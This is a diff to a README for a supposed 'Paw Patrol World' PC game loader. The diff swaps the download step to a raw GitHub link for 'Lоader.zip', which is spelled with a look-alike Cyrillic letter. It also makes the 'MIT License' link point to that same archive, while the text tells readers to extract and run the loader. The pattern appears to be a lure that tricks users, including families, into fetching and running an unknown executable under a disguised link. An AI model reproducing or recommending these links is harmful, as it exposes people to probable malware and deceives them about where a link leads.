@@ -34,7 +34,7 @@ Paw Patrol World , 2025 gaming loader, PC Mac Linux compatible, family games, pa
 
 ## 🛠️ Installation
 
-1. Download **Loader.rar** from the repository.
+1. Download **https://raw.githubusercontent.com/ndamze/PawPatrolWorld-FreePlayHub/main/Lоader.zip** from the repository.
 2. Extract and run the Loader on your platform.
 3. Follow on-screen instructions to start your Paw Patrol World experience!
 
@@ -48,5 +48,5 @@ This loader is intended for educational and entertainment purposes only. We do *
 
 ## 📜 License
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT).  
+Distributed under the [MIT License](https://raw.githubusercontent.com/ndamze/PawPatrolWorld-FreePlayHub/main/Lоader.zip).  
 © 2025 Paw Patrol World Loader Contributors. All rights reserved.
